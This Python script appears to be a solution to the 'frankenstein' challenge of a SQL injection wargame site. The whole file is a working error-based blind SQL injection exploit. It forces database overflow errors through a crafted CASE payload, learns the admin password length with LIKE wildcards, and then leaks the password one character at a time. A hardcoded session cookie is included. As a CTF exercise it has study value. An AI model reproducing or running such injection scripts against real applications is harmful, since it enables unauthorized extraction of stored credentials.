#!/usr/bin/env python3
# coding: utf-8

import requests
import string

headers = {
    'Cookie': 'PHPSESSID=6b28r4o43epapipkuj2n3oposs',
}


def string_to_hex(data):
    return ''.join(['{:02X}'.format(ord(c)) for c in data])


def is_true(query):
    url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?pw='||999999999999999999999999999999999*case when id='admin' and {0} then 1 when id<>'admin' then 0 else 99999999999999999999999999999*9999999999999999999999999999 end%23".format(query)
    r = requests.get(url, headers=headers)
    # print(r.text)
    if r.text.find('<br>error') > -1:
        return False
    return True


def get_password_length():
    i = 1
    while True:
        query = 'pw like 0x{0}'.format('5F' * i)
        if is_true(query):
            return i
        i += 1


def main():
    password = ''
    length = get_password_length()
    print('[*] password length :', length)
    for i in range(length):
        for c in string.printable:
            if c == '%':
                continue
            guess = password + c
            query = "pw like 0x{0}".format(string_to_hex(guess + '%'))
            if is_true(query):
                password += c
                print('[*] leaked password :', password)
                break


if __name__ == '__main__':
    main()


